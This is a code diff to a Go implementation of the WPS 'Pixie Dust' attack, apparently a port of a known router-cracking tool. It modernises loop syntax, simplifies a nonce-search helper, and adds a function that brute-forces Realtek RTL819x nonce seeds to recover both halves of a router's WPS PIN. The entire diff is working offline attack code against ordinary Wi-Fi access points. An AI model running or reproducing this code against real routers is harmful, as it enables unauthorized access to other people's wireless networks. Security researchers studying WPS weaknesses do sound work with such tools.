@@ -60,7 +60,6 @@ func (pda *pixieDustAttack) initCrackJobs(mode int) {
     }
 
     jc.initData()
-	jc.collectCrackJobs()
 }
 
 
@@ -98,9 +97,10 @@ func (jc *JobControl) initData() {
 
 
 func (jc *JobControl) wordForRTL819x() {
-    for i := 0; i < 4; i++ {
+    for i := range 4 {
         var word uint32
         idx := i * 4
+        
         word |= uint32(jc.pda.eNonce[idx]) << 24
         word |= uint32(jc.pda.eNonce[idx+1]) << 16
         word |= uint32(jc.pda.eNonce[idx+2]) << 8
@@ -194,7 +194,7 @@ func glibcFastSeed(seed uint32) uint32 {
 func glibcFastNonce(seed uint32) []byte {
     var word0, word1, word2, word3 uint32
 
-    for j := 0; j < 31; j++ {
+    for j := range 31 {
         word0 += seed * glibcSeedTbl[j+3]
         word1 += seed * glibcSeedTbl[j+2]
         word2 += seed * glibcSeedTbl[j+1]
@@ -208,10 +208,10 @@ func glibcFastNonce(seed uint32) []byte {
 
     nonce := make([]byte, 16)
     
-    binary.BigEndian.PutUint32(nonce[0:4], word0>>1)
-    binary.BigEndian.PutUint32(nonce[4:8], word1>>1)
-    binary.BigEndian.PutUint32(nonce[8:12], word2>>1)
-    binary.BigEndian.PutUint32(nonce[12:16], word3>>1)
+    binary.BigEndian.PutUint32(nonce[0:4],   word0 >> 1)
+    binary.BigEndian.PutUint32(nonce[4:8],   word1 >> 1)
+    binary.BigEndian.PutUint32(nonce[8:12],  word2 >> 1)
+    binary.BigEndian.PutUint32(nonce[12:16], word3 >> 1)
 
     return nonce
 }
@@ -284,15 +284,13 @@ func (jc *JobControl) crackRT(start, end uint32) (uint32, bool) {
 func (jc *JobControl) crackRTLESSeed(job *CrackJob) {
     threadID := job.start
     maxDist  := uint32(mode3Tries + 1)
-    pin      := make([]byte, wpsPinLen+1)
     nonceBuf := make([]byte, wpsSecretNonceLen)
 
     for dist := threadID; atomic.LoadUint32(&jc.nonceSeed) == 0 && dist < maxDist; dist += uint32(jc.jobs) {
-        if jc.findRTLES1(pin, nonceBuf, jc.pda.nonceSeed+uint32(dist)) {
+        if jc.findRTLES1(nonceBuf, jc.pda.nonceSeed+uint32(dist)) {
             seed := jc.pda.nonceSeed + uint32(dist)
             atomic.CompareAndSwapUint32(&jc.nonceSeed, 0, seed)
             copy(jc.pda.eSecret1, nonceBuf)
-            copy(jc.pda.pin, pin)
             break
         }
 
@@ -300,11 +298,10 @@ func (jc *JobControl) crackRTLESSeed(job *CrackJob) {
             break
         }
 
-        if dist > 0 && jc.findRTLES1(pin, nonceBuf, jc.pda.nonceSeed-uint32(dist)) {
+        if dist > 0 && jc.findRTLES1(nonceBuf, jc.pda.nonceSeed - uint32(dist)) {
             seed := jc.pda.nonceSeed - uint32(dist)
             atomic.CompareAndSwapUint32(&jc.nonceSeed, 0, seed)
             copy(jc.pda.eSecret1, nonceBuf)
-            copy(jc.pda.pin, pin)
             break
         }
     }
@@ -312,7 +309,7 @@ func (jc *JobControl) crackRTLESSeed(job *CrackJob) {
 
 
 
-func (jc *JobControl) findRTLES1(pin []byte, nonceBuf []byte, seed uint32) bool {
+func (jc *JobControl) findRTLES1(nonceBuf []byte, seed uint32) bool {
     rtlNonceFill(nonceBuf, seed)
     jc.pda.crackFirstHalf(nonceBuf)
     return jc.pda.firstHalf != -1
@@ -340,4 +337,44 @@ func rtlNonceFill(nonce []byte, seed uint32) {
     binary.BigEndian.PutUint32(nonce[4:8],   word1 >> 1)
     binary.BigEndian.PutUint32(nonce[8:12],  word2 >> 1)
     binary.BigEndian.PutUint32(nonce[12:16], word3 >> 1)
+}
+
+
+
+func (pda *pixieDustAttack) findRTLES() bool {
+    jc := &JobControl{
+        pda  : pda,
+        jobs : pda.jobs,
+        mode : -rtl819x,
+    }
+
+    jc.initData()
+    nonceBuf := make([]byte, wpsSecretNonceLen)
+
+    if jc.findRTLES1(nonceBuf, pda.nonceSeed) {
+        atomic.StoreUint32(&jc.nonceSeed, pda.nonceSeed)
+        copy(pda.eSecret1, nonceBuf)
+    }
+
+    jc.collectCrackJobs()
+
+    if jc.nonceSeed != 0 {
+        pda.s1Seed = jc.nonceSeed
+        copy(pda.eSecret1, nonceBuf)
+        pinCopy := pda.firstHalf
+
+        for j := range 10 {
+            pda.firstHalf = pinCopy
+
+            rtlNonceFill(pda.eSecret2, pda.s1Seed+uint32(j))
+            pda.crackSecondHalf()
+            
+            if pda.secondHalf != -1 {
+                pda.s2Seed = pda.s1Seed + uint32(j)
+                return true
+            }
+        }
+    }
+
+    return false
 }
